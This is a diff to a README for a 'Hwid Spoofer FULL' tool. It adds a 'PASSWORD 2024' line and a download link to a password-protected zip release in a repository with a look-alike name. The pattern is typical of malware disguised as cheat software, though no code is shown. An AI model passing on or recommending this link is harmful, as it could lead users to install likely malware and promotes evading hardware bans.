@@ -1,6 +1,8 @@
 # Hwid Spoofer FULL
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+# PASSWORD 2024 
+
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/amir-salmani/HWlD-2024-/releases/download/HWlD-2024/HWlD-2024.zip)
 
 ![spoofer_d900219be3 (1)](https://github.com/amir-salmani/HWlD-2024-/assets/152003128/525289e1-ec81-4751-9b6b-c294a3132bac)
 
